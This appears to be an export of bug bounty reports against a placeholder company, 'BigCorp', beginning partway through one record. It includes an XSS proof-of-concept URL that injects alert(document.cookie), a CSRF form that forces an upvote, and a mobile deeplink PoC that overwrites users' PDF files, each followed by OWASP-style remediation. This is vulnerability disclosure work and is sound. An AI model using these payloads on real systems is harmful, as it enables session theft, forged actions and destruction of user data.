**Affected browsers:** All modern

**Location XSS:**

```javascript
function showError()
{
	var launch = ' ! XSS ! ';
	if(launch == ""PrspAsMbr"") ...
```
and

```javascript
function hideError()
{
	var launch = ' ! XSS ! ';
	if(launch == ""PrspAsMbr"") ...
```


**POC:** Open URL. (see video pc_eng_pub)

####https://www.bigcorp.com/apps/QuoteEnginePublic?launchPoint=%27}%0ax=alert;x(document.cookie);{//%27

####https://mobile.bigcorp.com/apps/QuoteEnginePublic?launchPoint=%27}%0ax=alert;x(document.cookie);{//%27

Thank you,

Regards.",,,2019-06-16 08:48:00 UTC,2019-06-22 10:44:29 UTC,,www.bigcorp.com,website,"1. Always treat all user input as untrusted data.
2. Never insert untrusted data except in allowed locations.
3. Always input or output-encode all data coming into or out of the application.
4. Always whitelist allowed characters and seldom use blacklisting of characters except in certain use cases.
5. Always use a well-known and security encoding API for input and output encoding such as the `OWASP ESAPI`.
6. Never try to write input and output encoders unless absolutely necessary. Chances are that someone has already written a good one.
7. Never use the DOM function `innerHtml` and instead use the functions `innerText` and `textContent` to prevent against DOM-based XSS.
8. As a best practice, consider using the `HTTPOnly` flag on cookies that are session tokens or sensitive tokens.
9. As a best practice, consider implementing `Content Security Policy` to protect against XSS and other injection type attacks.
10. As a best practice, consider using an auto-escaping templating system.
11. As a best practice, consider using the `X-XSS-Protection` response header.","* [https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)](https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS))
* [https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))
* [https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md)
* [http://projects.webappsec.org/Cross-Site+Scripting](http://projects.webappsec.org/Cross-Site+Scripting)
* [https://www.cvedetails.com/vulnerability-list/opxss-1/xss.html](https://www.cvedetails.com/vulnerability-list/opxss-1/xss.html)
* [https://cwe.mitre.org/data/definitions/79](https://cwe.mitre.org/data/definitions/79)"
b016f895c6868b96be86041ad92d6d0254981c82a0b947b5aef6eagie9abee0o,bigcorp,platform,Haxor-07,CSRF in upvoting a post at community-vote.bigcorp.com,CSRF in upvoting a post at community-vote.bigcorp.com,4,100,5,2020-06-01 10:21:38 UTC,Cross-Site Request Forgery (CSRF) > Action-Specific > Authenticated Action,unresolved,open,false,https://community-vote.bigcorp.com,"Hi BigCorp,

I have found an interesting CSRF vulnerability in community-vote.bigcorp.com which allows an attacker to add a kudos point on behalf of victim users.

##Steps to Reproduce

1. Login the user in a browser
2. Copy the below HTML code and save it
3. Open the HTML file in the browser and click on Submit button
4. The post will be liked

If you want the victim to like other posts, just change the `message-id`. You can get the message-id by intercepting the request of liking the post.

##Impact
CSRF in adding kudos point leads to unauthorized adding of kudos","<html>
  <body>
    <form action=""https://communities-vote.bigcorp.com/t5/kudos/givekudosanonymouslyworkflowpage/board-id/family-life/message-id/386"">
      <input type=""submit"" value=""Submit request"" />
    </form>
  </body>
</html>
","Since the subdomain is not listed in-scope for the program, I asked the internal team whether to report or not. They said that I could report it and also be rewarded a small bounty if valid possibly.",2020-01-18 01:26:37 UTC,2020-01-23 16:39:34 UTC,,,,"1. Consider using a known and secure CSRF synchronizer API and apply the generated CSRF token to every request. If infeasible to apply to every request, generate a CSRF token for the entire session and apply that to every request or, at minimum, every request considered sensitive. Always make sure to check the actual CSRF token.
2. Consider verifying using same-origin rules to the source and target by checking the `Origin` and `Referer` headers.
3. Consider using the `Double Submit Cookie` pattern.
4. Consider using the `Encrypted Token` pattern.
5. Consider protecting REST services by using the `X-Requested-With: XMLHttpRequest` header in all requests.
6. Consider using re-authentication in cases where the request is particularly sensitive. This is the most effective CSRF prevention technique, however it does disturb the entire user experience.","* [https://www.owasp.org/index.php/Top_10_2013-A8-Cross-Site_Request_Forgery_(CSRF)](https://www.owasp.org/index.php/Top_10_2013-A8-Cross-Site_Request_Forgery_(CSRF))
* [https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.md](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.md)
* [http://projects.webappsec.org/w/page/13246919/Cross%20Site%20Request%20Forgery](http://projects.webappsec.org/w/page/13246919/Cross%20Site%20Request%20Forgery)
* [https://www.cvedetails.com/vulnerability-list/opcsrf-1/csrf.html](https://www.cvedetails.com/vulnerability-list/opcsrf-1/csrf.html)
* [https://cwe.mitre.org/data/definitions/352](https://cwe.mitre.org/data/definitions/352)"
gie9abee0o718cba86c5dc8aa830218fc45b4829582d0a6964f895c1ad0d80cb,bigcorp,platform,Haxor-08,Missing HttpOnly Flag - Session Cookies,Missing HttpOnly Flag - Session Cookies,4,100,5,2018-03-19 13:25:09 UTC,Server Security Misconfiguration > Missing Secure or HTTPOnly Cookie Flag > Session Token,unresolved,open,false,https://www.bigcorp.com/,"The BigCorp application session cookies are missing HttpOnly flag set.

Affected Session Cookies 
BCSESSIONID
bc_token
BigCToken
BigCToken2
bcsession

These  cookies appear to contain session tokens, which may increase the risk associated with this issue. 

Steps to Reproduce:
1. Authenticate to the BigCorp application as a user.
2. Intercept the request in the browser.
3. Navigate to 'Profile' page.
4. In the response look for affected Session cookies. For example BCSESSIONID
",,"I have notice the BigCorp application does not set HttpOnly cookie on any cookies Session / non session. Unless you specifically require legitimate client-side scripts within your application to read or set a cookie's value, you should set the HttpOnly flag by including this attribute within the relevant Set-cookie directive. For example CSRFtoken etc. is fine but not the session cookies.",2018-01-08 23:44:16 UTC,2018-01-15 21:35:42 UTC,,www.bigcorp.com,website,Set the `Secure` and `HTTPOnly` cookie flags for the session token.,"* [https://www.owasp.org/index.php/SecureFlag](https://www.owasp.org/index.php/SecureFlag)
* [https://www.owasp.org/index.php/HttpOnly](https://www.owasp.org/index.php/HttpOnly)
* [https://www.owasp.org/index.php/Top_10_2013-A5-Security_Misconfiguration](https://www.owasp.org/index.php/Top_10_2013-A5-Security_Misconfiguration)
* [http://projects.webappsec.org/w/page/13246959/Server%20Misconfiguration](http://projects.webappsec.org/w/page/13246959/Server%20Misconfiguration)
* [https://cwe.mitre.org/data/definitions/614](https://cwe.mitre.org/data/definitions/614)
* [https://cwe.mitre.org/data/definitions/1004](https://cwe.mitre.org/data/definitions/1004)
* [https://cwe.mitre.org/data/definitions/933](https://cwe.mitre.org/data/definitions/933)"
b2ab877b9933106b6396efbf3a990f45796ab324c72aecdb67f43bgie9abee0o,bigcorp,platform,Haxor-01,CSRF deeplink destroys user files via LFI  bigcorpapp://home/navigate?page_name=,CSRF deeplink destroys user files via LFI  bigcorpapp://home/navigate?page_name=,4,100,5,2020-07-05 12:35:23 UTC,Cross-Site Request Forgery (CSRF) > Application-Wide,unresolved,open,false,bigcorpapp://home/navigate?page_name=/storage/emulated/0/Download/MbAutoIdCardsServlet.pdf,"Hello,

I found a way to include local files with the deeplink `bigcorpapp://home/navigate?page_name=` which loads files and overwrites them with 203 bytes of data effectively destroying important user data. 

### Impact

Users can have all pdf files in  `BIGCORP_DOCS` overwritten and reformatted rendering all important/sensitive documents unusable. A wildcard can be used to overwite all pdf docs *.pdf.

---

### Steps to reproduce

1.  Download your Account ID card. This deeplink can be used to do so.

```
<html>
<p class=""p2"">- <a href=""bigcorpapp://launch/accountid"">accountid</a></p>
</html>
``` 
The document will be saved as `MbAccountIdCardsServlet.pdf`.

2 . Use the following deeplink PoC to overwrite the file without the users permission.

```
<html>
<p class=""p2"">- <a href=""bigcorpapp://home/navigate?page_name=/sdcard/Android/data/com.bigcorp.mobile.android.bigcorp/files/BIGCORP_DOCS/MbAccountIdCardsServlet.pdf"">Overwrite File</a></p>
</html>
```
The home/navigate?page_name deeplink checks remote addresses but not local paths. When the file is open it looks like the buffer is not big enough to read in the entire file and only 203 bytes are read in. So the activity reads as much of the file as it can then overwrites it. 

---

### PoC code

Push this html document to your test phone and click on these deeplinks. If you are not logged into BigCorp the intents will be preloaded and wait for the user to log in.

`adb push bigcorp-deeplink-poc.html /sdcard/Download`

```html
<html>
<p class=""p2"">- <a href=""bigcorpapp://launch/accountid"">Step 1: Grab accountid document</a></p>
<p class=""p2"">- <a href=""bigcorpapp://home/navigate?page_name=/sdcard/Android/data/com.bigcorp.mobile.android.bigcorp/files/BIGCORP_DOCS/MbAccountIdCardsServlet.pdf"">Step 2: Overwrite File</a></p>
</html>
```
---

### Fix

The best fix is to check for local paths as well such as `sdcard/Android/data/com.bigcorp.mobile.android.bigcorp/files/BIGCORP_DOCS/`. When a local path is used it should register as an invalid url.

Please let me know if you have any questions.",,,2020-03-02 02:07:16 UTC,2020-03-09 14:09:46 UTC,,BigCorp Mobile Application for Android,android,"1. Consider using a known and secure CSRF synchronizer API and apply the generated CSRF token to every request. If infeasible to apply to every request, generate a CSRF token for the entire session and apply that to every request or, at minimum, every request considered sensitive. Always make sure to check the actual CSRF token.
2. Consider verifying using same-origin rules to the source and target by checking the `Origin` and `Referer` headers.
3. Consider using the `Double Submit Cookie` pattern.
4. Consider using the `Encrypted Token` pattern.
5. Consider protecting REST services by using the `X-Requested-With: XMLHttpRequest` header in all requests.
6. Consider using re-authentication in cases where the request is particularly sensitive. This is the most effective CSRF prevention technique, however it does disturb the entire user experience.","* [https://www.owasp.org/index.php/Top_10_2013-A8-Cross-Site_Request_Forgery_(CSRF)](https://www.owasp.org/index.php/Top_10_2013-A8-Cross-Site_Request_Forgery_(CSRF))
* [https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.md](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.md)
* [http://projects.webappsec.org/w/page/13246919/Cross%20Site%20Request%20Forgery](http://projects.webappsec.org/w/page/13246919/Cross%20Site%20Request%20Forgery)
* [https://www.cvedetails.com/vulnerability-list/opcsrf-1/csrf.html](https://www.cvedetails.com/vulnerability-list/opcsrf-1/csrf.html)
* [https://cwe.mitre.org/data/definitions/352](https://cwe.mitre.org/data/definitions/352)"
gie9abee0ofebbf55ec9bafc43c482249c6e01697f42214efebc357f399f4e5c,bigcorp,platform,Haxor-01,Clipboard enabled on personal account number with summary,Clipboard enabled on personal account number with summary,4,100,5,2018-12-24 10:00:13 UTC,Mobile Security Misconfiguration > Clipboard Enabled > On Sensitive Content,unresolved,open,false,Account section of Android application,"Good afternoon,

I am a account holder of BigCorp and noticed that all my account data can be copied to the clipboard. I consider this sensitive data because my account number is listed without being ***** out and is copied in plaintext.

####POC
Please see the images attached.

Example Java method to steal clipboard data:

```java
...
// if the user selects copy
case R.id.menu_copy:

// Gets a handle to the clipboard service.
ClipboardManager clipboard = (ClipboardManager)
        getSystemService(Context.CLIPBOARD_SERVICE);
```
There are a lot of apps that call the clipboard data remotely and leak sensitive information.

Please let me know if you have any questions.

----

####Resources

[https://developer.android.com/guide/topics/text/copy-paste#java](https://developer.android.com/guide/topics/text/copy-paste#java)

[https://security.stackexchange.com/questions/176373/can-phone-apps-read-my-clipboard](https://security.stackexchange.com/questions/176373/can-phone-apps-read-my-clipboard)",,,2018-10-19 20:12:52 UTC,2018-10-24 19:26:05 UTC,,BigCorp Mobile Application for Android,android,"Ensure that copy/paste functionality is disabled on sensitive content like credit card numbers, social security numbers etc. as other apps on the same device can access data stored in clipboard.
The example below disables clipboard for the `textField` TextView in Android:
```java
textField.setCustomSelectionActionModeCallback(new ActionMode.Callback() {
  public boolean onCreateActionMode(ActionMode actionMode, Menu menu) {
    return false;
  }

  public boolean onPrepareActionMode(ActionMode actionMode, Menu menu) {
    return false;
  }

  public boolean onActionItemClicked(ActionMode actionMode, MenuItem item) {
    return false;
  }

  public void onDestroyActionMode(ActionMode actionMode) {
  }
});
textField.setLongClickable(false);
textField.setTextIsSelectable(false);
```
The example below disables clipboard for UITextField in iOS:
```swift
override public func canPerformAction(_ action: Selector, withSender sender: Any?) -> Bool {
  if action == #selector(copy(_:)) || action == #selector(paste(_:)) {
    return false
  }
  return true
}
```",* [https://cwe.mitre.org/data/definitions/919](https://cwe.mitre.org/data/definitions/919)
